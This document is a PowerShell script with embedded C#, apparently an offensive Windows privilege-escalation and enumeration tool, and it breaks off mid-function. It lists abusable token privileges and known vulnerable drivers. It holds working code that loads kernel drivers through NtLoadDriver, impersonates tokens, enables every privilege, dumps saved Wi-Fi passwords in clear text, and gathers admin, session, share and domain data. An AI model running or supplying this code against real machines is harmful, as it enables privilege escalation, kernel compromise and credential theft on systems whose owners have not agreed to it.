Add-Type -AssemblyName System.DirectoryServices

# Debug mode variable
$DEBUG_MODE = $false

# Global data objects
$gCollect = @{
    UserDetails = @{}
    Privileges = @{}
    Groups = @{}
    OtherData = @{}
}

$privList = @(
    @{name = "SeImpersonatePrivilege"; message = "Can impersonate another user's security context. Often abused in RottenPotato-style attacks."},
    @{name = "SeAssignPrimaryTokenPrivilege"; message = "Allows assigning primary tokens, useful in token theft or paired with SeImpersonatePrivilege for privilege escalation."},
    @{name = "SeBackupPrivilege"; message = "Permits reading any file on the system, even sensitive ones, potentially useful for privilege escalation."},
    @{name = "SeRestorePrivilege"; message = "Allows restoring files, including overwriting important system files for privilege escalation."},
    @{name = "SeCreateTokenPrivilege"; message = "Can create security tokens, potentially to escalate privileges by creating tokens with higher permissions."},
    @{name = "SeLoadDriverPrivilege"; message = "Allows loading drivers, potentially malicious ones, to escalate privileges by compromising the kernel."},
    @{name = "SeTakeOwnershipPrivilege"; message = "Grants the ability to take ownership of files or objects, enabling control over sensitive system resources."},
    @{name = "SeDebugPrivilege"; message = "Permits debugging processes, which can be abused to inject into system processes and escalate privileges."},
    @{name = "SeTcbPrivilege"; message = "Allows the account to act as part of the operating system, granting SYSTEM-level privileges."},
    @{name = "SeSecurityPrivilege"; message = "Allows managing security logs, including clearing them, which could be abused to hide malicious activity."},
    @{name = "SeRemoteShutdownPrivilege"; message = "Permits remotely shutting down the system, potentially useful in denial-of-service attacks."},
    @{name = "SeAuditPrivilege"; message = "Allows generating security audits. Rarely abused, but could be leveraged for specific attacks."},
    @{name = "SeIncreaseQuotaPrivilege"; message = "Permits increasing process memory quotas, potentially exploitable for privilege escalation under specific conditions."},
    @{name = "SeChangeNotifyPrivilege"; message = "Allows bypassing some security checks, such as traversing directories. Typically low-risk."},
    @{name = "SeUndockPrivilege"; message = "Allows undocking the machine. Not generally useful for privilege escalation."},
    @{name = "SeManageVolumePrivilege"; message = "Grants ability to manage disk volumes, which can potentially be abused for mounting sensitive volumes."},
    @{name = "SeProfileSingleProcessPrivilege"; message = "Allows profiling system processes, which may be useful for certain side-channel attacks."},
    @{name = "SeSystemtimePrivilege"; message = "Allows changing the system time, generally not useful for privilege escalation."},
    @{name = "SeTimeZonePrivilege"; message = "Allows changing the time zone, which is typically considered low-risk for privilege escalation."},
    @{name = "SeCreatePagefilePrivilege"; message = "Permits creating a pagefile, generally not exploitable for privilege escalation."},
    @{name = "SeLockMemoryPrivilege"; message = "Allows locking memory, which could potentially be used to interfere with system stability."},
    @{name = "SeIncreaseBasePriorityPrivilege"; message = "Allows increasing the base priority of processes. Rarely useful for privilege escalation."},
    @{name = "SeLoadDriverPrivilege"; message = "Permits loading of drivers, potentially allowing malicious drivers to escalate privileges."},
    @{name = "SeServiceLogonRight"; message = "Allows a user to log on as a service, which can be exploited to run services with higher privileges."},
    @{name = "SeBatchLogonRight"; message = "Allows logging on as a batch job, possibly useful for running malicious scripts with elevated privileges."},
    @{name = "SeNetworkLogonRight"; message = "Allows logging on over the network. Typically not exploitable for privilege escalation on its own."},
    @{name = "SeInteractiveLogonRight"; message = "Permits interactive logon. Rarely abused directly, but could provide access for privilege escalation."},
    @{name = "SeShutdownPrivilege"; message = "Allows shutting down the system, useful for denial-of-service attacks, but not privilege escalation."},
    @{name = "SeSystemProfilePrivilege"; message = "Permits profiling system performance, potentially exploitable in advanced side-channel attacks."},
    @{name = "SeRemoteInteractiveLogonRight"; message = "Allows remote interactive logon. Rarely useful for direct privilege escalation but may facilitate remote access."},
    @{name = "SeTakeOwnershipPrivilege"; message = "Allows taking ownership of files or objects, which can be exploited to gain control over system resources."},
    @{name = "SeTrustedCredManAccessPrivilege"; message = "Allows access to Credential Manager, which could be leveraged to obtain stored credentials for privilege escalation."},
    @{name = "SeRelabelPrivilege"; message = "Permits modifying the integrity levels of objects. Rarely exploited directly but could be useful in certain situations."},
    @{name = "SeSyncAgentPrivilege"; message = "Allows synchronizing directories, typically considered low-risk for privilege escalation."},
    @{name = "SeTimeZonePrivilege"; message = "Allows changing the time zone. Not generally useful for privilege escalation."},
    @{name = "SeUndockPrivilege"; message = "Allows a machine to be undocked. Generally not useful for privilege escalation."},
    @{name = "SeTrustedCredManAccessPrivilege"; message = "Allows trusted access to stored credentials in the Credential Manager."}
)

$vDrivers = @(
    @{ Name = "Capcom.sys" },
    @{ Name = "RTCore64.sys" },
    @{ Name = "RTCore32.sys" },
    @{ Name = "AsrDrv103.sys" },
    @{ Name = "GDRV.sys" },
    @{ Name = "TVicPort.sys" },
    @{ Name = "SpeedFan.sys" },
    @{ Name = "Aida64Driver.sys" },
    @{ Name = "Heci.sys" },
    @{ Name = "WinRing0.sys" },
    @{ Name = "WinRing0x64.sys" },
    @{ Name = "AsusFanControl.sys" },
    @{ Name = "PROCEXP152.sys" },
    @{ Name = "DBUtilDrv2.sys" },
    @{ Name = "MateBookManager.sys" },
    @{ Name = "ZemanaAntiMalwareDriver" }
)

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Security.Principal;
using System.Collections;
using System.Text;
using System.Diagnostics;
using System.Linq;

public class DriverLoader
{
    [DllImport("ntdll.dll")]
    public static extern int NtLoadDriver(IntPtr DriverServiceName);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RegCreateKeyEx(IntPtr hKey, string lpSubKey, uint Reserved, string lpClass, uint dwOptions, uint samDesired, IntPtr lpSecurityAttributes, out IntPtr phkResult, out uint lpdwDisposition);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegSetValueEx(IntPtr hKey, string lpValueName, uint Reserved, uint dwType, byte[] lpData, uint cbData);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern void RegCloseKey(IntPtr hKey);

    public static void LoadDriver(string registryPath, string driverPath)
    {
        IntPtr hKey;
        uint dwDisposition;
        
        // Create the registry key for the driver
        bool result = RegCreateKeyEx((IntPtr)0x80000002, registryPath, 0, null, 0, 0xF003F, IntPtr.Zero, out hKey, out dwDisposition);
        if (!result)
        {
            // Retrieve and display the error code
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("Failed to create registry key. Error Code: {errorCode}");
            return;
        }
        
        // Set the ImagePath value
        byte[] driverPathBytes = System.Text.Encoding.Unicode.GetBytes(driverPath);
        RegSetValueEx(hKey, "ImagePath", 0, 1, driverPathBytes, (uint)driverPathBytes.Length);
        
        // Set other required values
        RegSetValueEx(hKey, "Type", 0, 4, BitConverter.GetBytes(1), 4);
        RegSetValueEx(hKey, "ErrorControl", 0, 4, BitConverter.GetBytes(1), 4);
        RegSetValueEx(hKey, "Start", 0, 4, BitConverter.GetBytes(3), 4);
        
        RegCloseKey(hKey);
        
        // Load the driver
        IntPtr driverServiceName = Marshal.StringToHGlobalUni(registryPath);
        int status = NtLoadDriver(driverServiceName);
        Marshal.FreeHGlobal(driverServiceName);
        
        if (status != 0)
        {
            Console.WriteLine("Failed to load driver.");
        }
        else
        {
            Console.WriteLine("Driver loaded successfully.");
            // Execute cmd.exe as a test
            System.Diagnostics.Process.Start("cmd.exe");
        }
    }
}

public class TokenImp {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public extern static bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public extern static IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public extern static bool DuplicateToken(IntPtr existingTokenHandle, int impersonationLevel, out IntPtr duplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public extern static bool ImpersonateLoggedOnUser(IntPtr hToken);

    public const uint TOKEN_DUPLICATE = 0x0002;
    public const int SecurityImpersonation = 2;

    public static bool ImpSys() {
        IntPtr currentTokenHandle = IntPtr.Zero;
        IntPtr duplicateTokenHandle = IntPtr.Zero;

        // Get the current process token
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, out currentTokenHandle)) {
            return false;
        }

        // Duplicate the token
        if (!DuplicateToken(currentTokenHandle, SecurityImpersonation, out duplicateTokenHandle)) {
            return false;
        }

        // Impersonate the duplicated token
        if (!ImpersonateLoggedOnUser(duplicateTokenHandle)) {
            return false;
        }

        return true;
    }
}

public class SetTokenPriv
{
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
    ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }
    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public static void EnablePrivilege()
    {
        bool retVal;
        TokPriv1Luid tp;
        IntPtr hproc = new IntPtr();
        hproc = Process.GetCurrentProcess().Handle;
        IntPtr htok = IntPtr.Zero;

        List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SePrivileges", "SeIncreaseBasePriorityPrivilege",
        "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
        "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
        "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
        "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
        "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };


        

        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;

        foreach (var priv in privs)
        {
            retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
        }
    }
}  

public class PrivilegeFetcher
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool LookupPrivilegeName(string lpSystemName, ref LUID lpLuid, System.Text.StringBuilder lpName, ref int cchName);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    const int TokenPrivileges = 3; // TokenPrivileges enum
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    public static void FetchPrivileges()
    {
        IntPtr processHandle = GetCurrentProcess();
        IntPtr tokenHandle;

        if (OpenProcessToken(processHandle, 0x0008, out tokenHandle)) // TOKEN_QUERY
        {
            // Get token privileges
            int tokenInfoLength = 0;
            GetTokenInformation(tokenHandle, TokenPrivileges, IntPtr.Zero, 0, out tokenInfoLength);

            IntPtr tokenInfo = Marshal.AllocHGlobal(tokenInfoLength);
            if (GetTokenInformation(tokenHandle, TokenPrivileges, tokenInfo, tokenInfoLength, out tokenInfoLength))
            {
                // First, read the privilege count
                uint privilegeCount = (uint)Marshal.ReadInt32(tokenInfo);

                // Offset to start reading privileges
                IntPtr privilegesPtr = new IntPtr(tokenInfo.ToInt64() + sizeof(uint));

                for (int i = 0; i < privilegeCount; i++)
                {
                    LUID_AND_ATTRIBUTES luidAndAttributes = (LUID_AND_ATTRIBUTES)Marshal.PtrToStructure(privilegesPtr, typeof(LUID_AND_ATTRIBUTES));
                    LUID luid = luidAndAttributes.Luid;

                    // Lookup privilege name
                    System.Text.StringBuilder privilegeName = new System.Text.StringBuilder(256);
                    int nameLength = privilegeName.Capacity;
                    if (LookupPrivilegeName(null, ref luid, privilegeName, ref nameLength))
                    {
                        string name = privilegeName.ToString();
                        bool isEnabled = (luidAndAttributes.Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED;
                        Console.WriteLine("Privilege: {0}, Enabled: {1}", name, isEnabled);
                    }
                    else
                    {
                        Console.WriteLine("Failed to lookup privilege name.");
                    }

                    // Move the pointer to the next privilege
                    privilegesPtr = new IntPtr(privilegesPtr.ToInt64() + Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES)));
                }
            }
            Marshal.FreeHGlobal(tokenInfo);
        }
        else
        {
            Console.WriteLine("Failed to open process token.");
        }
    }
}

public class PrivilegeFetcher2
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaOpenPolicy(IntPtr systemName, ref LSA_OBJECT_ATTRIBUTES objAttributes, int desiredAccess, out IntPtr policyHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaEnumerateAccountRights(IntPtr policyHandle, IntPtr accountSid, out IntPtr userRights, out int countOfRights);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaClose(IntPtr policyHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupAccountName(string lpSystemName, string lpAccountName, IntPtr Sid, ref int cbSid, StringBuilder ReferencedDomainName, ref int cchReferencedDomainName, out int peUse);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaNtStatusToWinError(int status);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [DllImport("netapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int NetLocalGroupEnum(
        string serverName, 
        int level, 
        out IntPtr bufPtr, 
        int prefMaxLen, 
        out int totalEntries, 
        out int totalBytesNeeded, 
        out IntPtr resumeHandle
    );

    [DllImport("netapi32.dll", SetLastError = true)]
    public static extern int NetApiBufferFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct LOCALGROUP_INFO_0
    {
        public IntPtr grpi0_name;
    }

    public static List<string> GetGroupPrivileges(string groupName)
    {
        var output = new List<string>();
        IntPtr policyHandle;

        // Set LSA Object Attributes to zero
        LSA_OBJECT_ATTRIBUTES lsaAttributes = new LSA_OBJECT_ATTRIBUTES();
        lsaAttributes.Length = Marshal.SizeOf(lsaAttributes);

        int result = LsaOpenPolicy(IntPtr.Zero, ref lsaAttributes, 0x00000800, out policyHandle);
        if (result != 0)
        {
            output.Add("[-] Failed to open LSA policy. Error Code: " + LsaNtStatusToWinError(result));
            return output;
        }

        IntPtr sid = GetGroupSid(groupName);
        if (sid == IntPtr.Zero)
        {
            output.Add("[-] Failed to retrieve SID for group: " + groupName);
            return output;
        }

        IntPtr userRights;
        int countOfRights;
        result = LsaEnumerateAccountRights(policyHandle, sid, out userRights, out countOfRights);

        if (result != 0)
        {
            output.Add("[-] Failed to enumerate account rights. Error Code: " + LsaNtStatusToWinError(result));
        }
        else if (userRights == IntPtr.Zero || countOfRights == 0)
        {
            output.Add("[-] No privileges found for this group.");
        }
        else
        {
            IntPtr iter = userRights;
            for (int i = 0; i < countOfRights; i++)
            {
                try
                {
                    string privilege = Marshal.PtrToStringUni(Marshal.ReadIntPtr(iter));
                    output.Add("  - Privilege: " + privilege);
                    iter = IntPtr.Add(iter, IntPtr.Size);
                }
                catch (AccessViolationException)
                {
                    output.Add("[-] Failed to read privilege from memory.");
                    break;
                }
            }
        }

        LsaClose(policyHandle);
        return output;
    }

    public static List<string> GetLocalGroups()
    {
        var groups = new List<string>();
        IntPtr bufPtr = IntPtr.Zero;
        IntPtr resumeHandle = IntPtr.Zero;
        int totalEntries;
        int totalBytesNeeded;

        int result = NetLocalGroupEnum(
            null, // local machine
            0,    // information level 0 (group names)
            out bufPtr, 
            -1,   // unlimited buffer size
            out totalEntries, 
            out totalBytesNeeded, 
            out resumeHandle
        );

        if (result == 0 && bufPtr != IntPtr.Zero)
        {
            try
            {
                int structSize = Marshal.SizeOf(typeof(LOCALGROUP_INFO_0));
                for (int i = 0; i < totalEntries; i++)
                {
                    IntPtr current = IntPtr.Add(bufPtr, i * structSize);
                    LOCALGROUP_INFO_0 groupInfo = (LOCALGROUP_INFO_0)Marshal.PtrToStructure(current, typeof(LOCALGROUP_INFO_0));

                    string groupName = Marshal.PtrToStringAuto(groupInfo.grpi0_name);
                    groups.Add(groupName);
                }
            }
            finally
            {
                NetApiBufferFree(bufPtr);
            }
        }
        else
        {
            groups.Add("[-] Failed to retrieve local groups. Error Code: {result}");
        }

        return groups;
    }

    public static IntPtr GetGroupSid(string groupName)
    {
        int sidSize = 0;
        int domainNameSize = 0;
        int peUse;

        // Call with null values to get the required buffer sizes
        LookupAccountName(null, groupName, IntPtr.Zero, ref sidSize, null, ref domainNameSize, out peUse);

        // Allocate buffers
        IntPtr sid = Marshal.AllocHGlobal(sidSize);
        StringBuilder domainName = new StringBuilder(domainNameSize);

        bool success = LookupAccountName(null, groupName, sid, ref sidSize, domainName, ref domainNameSize, out peUse);

        if (!success)
        {
            Marshal.FreeHGlobal(sid);
            return IntPtr.Zero;
        }

        return sid;
    }
}

public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
}
"@

function compileOTF {
    # Compile and load on-the-fly - used mostly for testing and demo purposes
    $tempPath = "C:\Windows\Temp"
    $driverSourcePath = Join-Path -Path $tempPath -ChildPath "HelloWorld.cs"
    $compiledDriverPath = Join-Path -Path $tempPath -ChildPath "HelloWorld.exe"
    $driverSource = @"
using System; using System.Runtime.InteropServices; public class HelloWorld { [DllImport("user32.dll")] public static extern int MessageBox(int hWnd, string text, string caption, int type); public static void Main() { MessageBox(0, System.Security.Principal.WindowsIdentity.GetCurrent().Name, "Driver runs as User:", 0);} } 
"@
    Set-Content -Path $driverSourcePath -Value $driverSource

    # Compile the C# code using csc.exe
    $cscPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    & $cscPath -out:$compiledDriverPath $driverSourcePath

    if (Test-Path $compiledDriverPath) {
        Write-Output "[+] Driver compiled successfully. Attempting to load..."
        Start-Process -FilePath $compiledDriverPath
    } else {
        Write-Output "[-] Driver compilation failed."
    }
}

function Get-LocalizedUserMapping {
    $userMappings = @{
        'administrators' = 'S-1-5-32-544'
        'nt authority\system' = 'S-1-5-18'
        'users' = 'S-1-5-32-545'
        'authenticated users' = 'S-1-5-11'
        'nt authority\network service' = 'S-1-5-20'
        'everyone' = 'S-1-1-0'
        'nt authority\local service' = 'S-1-5-19'
    }    

    $localizedUser = @{}

    foreach ($englishName in $userMappings.Keys) {
        # Get the SID
        $sid = $userMappings[$englishName]

        # Get the localized name for the current system language
        $localizedName = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value.ToLower()

        # Check if the English name contains a backslash
        if ($englishName -notmatch '\\') {
            # Remove any prefix using regex (e.g., ".*\")
            $localizedName = $localizedName -replace '.*\\', ''
        }

        # Populate the hashtable with all mappings
        $localizedUser[$englishName] = @{
            SID = $sid
            LocalizedName = $localizedName
        }

        $localizedUser[$localizedName] = @{
            SID = $sid
            EnglishName = $englishName
        }

        $localizedUser[$sid] = @{
            SID = $sid
            LocalizedName = $localizedName
            EnglishName = $englishName
        }
    }

    return $localizedUser
}

function splitStringToColumns {
    param (
        [string]$inputString
    )

    # Initialize an array to hold the columns as strings
    $columns = @()

    # Split the input by newline to handle multiple lines
    $inputLines = $inputString -split "`n"

    # Process each line in the input
    foreach ($line in $inputLines) {
        # Trim the line to remove leading/trailing whitespace
        $line = $line.Trim()

        # Skip empty lines
        if (-not [string]::IsNullOrWhiteSpace($line)) {
            # Split the line into parts based on whitespace (one or more spaces or tabs)
            $parts = $line -split '\s+'

            # Add parts to the corresponding column index
            for ($i = 0; $i -lt $parts.Length; $i++) {
                if ($columns.Count -le $i) {
                    $columns += ""  # Dynamically add new columns
                }
                $columns[$i] += $parts[$i] + "`n"  # Append the part with a newline
            }
        }
    }
    return $columns
}

function runSubprocess {
    param(
        [string]$filename,
        [string]$argList
    )
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName =  $filename
    $processInfo.Arguments = $argList
    $processInfo.RedirectStandardOutput = $true
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true

    # Create the process
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processInfo

    # Start the process
    $process.Start() | Out-Null

    # Read the output
    $output = $process.StandardOutput.ReadToEnd()
    
    # Wait for the process to exit
    $process.WaitForExit()

    # Output the result
    return $output
}

function Get-LocalAdminGroupName {
    try {
        $adminGroup = (Get-WmiObject -Class Win32_Group -Filter "SID='S-1-5-32-544'").Name
        return $adminGroup
    } catch {
        Write-Output "[-] Failed to get Administrators group name: $_"
        return $null
    }
}

# This is intended to get at least some info when no LDAP is present (non AD machine)
function Get-AllLocalGroupsInfo {
    # Get the local computer entry
    $localComputer = New-Object System.DirectoryServices.DirectoryEntry("WinNT://$($env:COMPUTERNAME),computer")

    $groupDetailsList = @()

    # Iterate through each child of the local computer entry
    foreach ($child in $localComputer.Children) {
        if ($child.SchemaClassName -eq 'Group') {
            $groupEntry = New-Object System.DirectoryServices.DirectoryEntry($child.Path)

            $groupDetails = @{
                Name        = $groupEntry.Name
                Description = $groupEntry.Properties["Description"].Value
                Members     = @()
                # Probably not working
                # Privileges  = @()
            }

            # List group members
            try {
                $members = $groupEntry.Invoke("Members")
                foreach ($member in $members) {
                    $memberEntry = New-Object System.DirectoryServices.DirectoryEntry($member)
                    if ($memberEntry -ne $null) {
                        $groupDetails.Members += $memberEntry.Name
                    }
                }
            } catch {
                Write-Error "Error retrieving members for group '$($groupEntry.Name)': $_"
            }

            # Attempt to get privileges
            
            #try {
                # This will likely need to be adjusted based on your environment
            #    $privileges = $groupEntry.Properties["Privileges"].Value
            #    if ($privileges -ne $null) {
            #        $groupDetails.Privileges = $privileges
            #    } 
            #} catch {
            #    Write-Error "Error retrieving privileges for group '$($groupEntry.Name)': $_"
            #}
            
            $groupDetailsList += $groupDetails
        }
    }

    return $groupDetailsList
}

# Collect local administrators (language independent)
function collect_LAs {
    # Get the local Administrators group name based on SID
    $localAdminGroupName = Get-LocalAdminGroupName

    if ($localAdminGroupName -eq $null) {
        Write-Output "[-] Could not determine the local administrators group name."
        return
    }

    # First attempt using Get-LocalGroupMember
    try {
        $localAdmins = Get-LocalGroupMember -Group $localAdminGroupName | Select-Object -ExpandProperty Name
        $gCollect['SH_Data']['LocalAdmins'] = $localAdmins
        Write-Output "[+] Local Admins collected using Get-LocalGroupMember"
        Write-Output $localAdmins
        Write-Output ""
    } catch {
        Write-Output "[-] Get-LocalGroupMember failed, attempting WMI method: $_"
        
        # Fallback to WMI method
        try {
            $localAdmins = Get-WmiObject -Query "ASSOCIATORS OF {Win32_Group.Domain='$env:COMPUTERNAME', Name='$localAdminGroupName'} WHERE AssocClass=Win32_GroupUser" | Select-Object -ExpandProperty Name
            $gCollect['SH_Data']['LocalAdmins'] = $localAdmins
            Write-Output "[+] Local Admins collected using WMI method"
            Write-Output $localAdmins
            Write-Output ""
        } catch {
            Write-Output "[-] WMI method failed: $_"
        }
    }
}
function getWifiKeys {
    # Check if wlansvc is running, otherwise fail gracefully
    try {
        $wlansvcStatus = Get-Service -Name WlanSvc -ErrorAction SilentlyContinue
        if ($wlansvcStatus.Status -eq 'Running') {

            # Get all saved Wi-Fi profiles
            $profiles = netsh wlan show profiles | Select-String ":(.*)" | ForEach-Object {
                ($_ -split ":")[1].Trim()
            }

            if ($profiles.Count -eq 0) {
                Write-Output "[-] No Wi-Fi profiles found"
                return
            }

            # Loop through each profile and show password and other details
            foreach ($profile in $profiles) {
                $profileInfo = netsh wlan show profile name="$profile" key=clear

                # Display Wi-Fi profile name
                Write-Output "Wi-Fi Profile: $profile"
                
                # Look for Key Content (password), handling different locales
                $keyContentLine = $profileInfo | Select-String "(Key Content|Schlüsselinhalt|Contenido de la clave|Clave de red)" 
                
                if ($keyContentLine) {
                    $password = ($keyContentLine -split ":")[1].Trim()
                    Write-Output "Password: $password"
                } else {
                    Write-Output "Password: No password saved or profile uses a non-standard method."
                }

                # Display more useful info: Authentication, Cipher, Connection type
                $authLine = $profileInfo | Select-String "(Authentication|Authentifizierung|Autenticación)"
                $cipherLine = $profileInfo | Select-String "(Cipher|Verschlüsselung|Cifrado)"
                $connectionTypeLine = $profileInfo | Select-String "(Connection mode|Verbindungsmodus|Modo de conexión)"

                if ($authLine) {
                    $authType = ($authLine -split ":")[1].Trim()
                    Write-Output "Authentication: $authType"
                }

                if ($cipherLine) {
                    $cipherType = ($cipherLine -split ":")[1].Trim()
                    Write-Output "Cipher: $cipherType"
                }

                if ($connectionTypeLine) {
                    $connectionType = ($connectionTypeLine -split ":")[1].Trim()
                    Write-Output "Connection Type: $connectionType"
                }

                Write-Output "-----------------------------"
            }
        }
        else {
            Write-Output "[-] WLAN AutoConfig service (wlansvc) is not running."
        }
    }
    catch {
        Write-Output "[-] Error occurred while retrieving Wi-Fi keys: $_"
    }
}

function sh_check {
    Write-Output "[$([char]0xD83D + [char]0xDC80)] Starting additional SH-focused collection..." 
    Write-Output "Note: This is not intended to be run alone, but relies on data"
    Write-Output "from the other checks."
    Write-Output " "

    # Initialize collections if needed
    if (-not $gCollect['SH_Data']) {
        $gCollect['SH_Data'] = @{
            LocalAdmins       = @{}
            LoggedOnUsers     = @{}
            ActiveSessions    = @{}
            NetworkShares     = @{}
            DomainInfo        = @{}
            GroupMemberships   = @{}
            GroupPolicies      = @{}
            TokenDelegation    = @{}
            TrustRelationships = @{}
            SecurityPolicies   = @{}
            AntiVirusProducts  = @{}
            Firewalls          = @{}
            InstalledServices   = @{}
            SecuritySettings    = @{}
            SystemEvents       = @{}
        }
    }

    # Check Local Admins
    collect_LAs

    # Check Active Sessions
    try {
        $activeSessions = @()

        # Get all logon sessions
        $logonSessions = Get-WmiObject -Class Win32_LogonSession | Where-Object { $_.LogonType -eq 2 }

        foreach ($session in $logonSessions) {
            # Get the associated logged-on user
            $loggedOnUsers = Get-WmiObject -Class Win32_LoggedOnUser | Where-Object { $_.Dependent -like "*LogonId=`"$($session.LogonId)`"" }
            
            foreach ($user in $loggedOnUsers) {
                # Extract the username from Antecedent
                $username = ($user.Antecedent -replace '\\\\.\\root\\cimv2:Win32_Account.Domain="[^"]+",Name="', '') -replace '"$', ''
                
                # Create a custom object for each session/user pair
                $activeSessions += [PSCustomObject]@{
                    UserName    = $username
                    SessionID   = $session.LogonId
                    LogonType   = $session.LogonType
                    StartTime   = $session.StartTime
                }
            }
        }

        $gCollect['SH_Data']['ActiveSessions'] = $activeSessions
        Write-Output "[+] Active sessions collected: $($activeSessions.Count) active sessions found."
    } catch {
        Write-Output "[-] Failed to collect active sessions: $_"
    }

    # Enumerate Network Shares
    try {
        $networkShares = Get-WmiObject -Class Win32_Share | Select-Object Name, Path, Description
        $gCollect['SH_Data']['NetworkShares'] = $networkShares
        Write-Output "[+] Network shares collected"
        Write-Output $networkShares | Format-Table -AutoSize
    } catch {
        Write-Output "[-] Failed to collect network shares: $_"
    }

    # Collect Domain Information (if domain-joined)
    $isDomainJoined = $null
    try {
        $isDomainJoined = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
        $gCollect['SH_Data']['DomainInfo'] = $isDomainJoined
        Write-Output "[+] Domain information collected, machine is domain joined? " $isDomainJoined
    } catch {
        Write-Output "[-] Failed to collect domain information: $_"
    }

    # Enumerate Group Memberships
    try {
        $userGroups = Get-WmiObject -Query "ASSOCIATORS OF {Win32_UserAccount.Domain='$env:USERDOMAIN',Name='$env:USERNAME'} WHERE AssocClass=Win32_GroupUser"
        $gCollect['SH_Data']['GroupMemberships'] = $userGroups | Select-Object Name
        Write-Output "[+] Group memberships collected"
    } catch {
